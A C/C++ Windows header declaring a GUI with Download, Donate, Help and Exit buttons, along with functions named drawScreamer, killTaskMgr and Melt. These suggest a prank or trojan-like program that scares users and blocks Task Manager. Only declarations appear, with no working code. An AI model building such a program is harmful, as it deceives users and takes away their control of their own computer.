#pragma once
#include <Windows.h>

#define OnHelpClicked		1
#define OnDownloadClicked	2
#define OnOpenClicked		3
#define OnDonateClicked		4
#define OnExitClicked		5

#define DownloadBtnWidth	200
#define DownloadBtnHeight	60

#define DonateBtnWidth	150
#define DonateBtnHeight	50

#define ExitBtnWidth	100
#define ExitBtnHeight	50

#define HelpBtnWidth	100
#define HelpBtnHeight	50

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
TCHAR WinName[] = _T("MainFrame");

RECT wndRect;
RECT fontRect;
PAINTSTRUCT ps;
HBRUSH hBrush;
HFONT hFont;
HFONT hDefaultFont;
HDC hdc;

HWND hDownload;
HWND hInfo;
HWND hDonate;
HWND hExit;

void MainWndAddMenus(HWND hWnd);
void MainWndVidgetes(HWND hWnd);
void draw(HDC hdc);
void FontApply();
void drawScreamer(HDC hdc);
void killTaskMgr();

bool is_Screamer = false;

int srcWidth;
int srcHeitght;
int interval = 100;

LRESULT	CALLBACK Melt(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

int APIENTRY CallMelt(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int showCmd);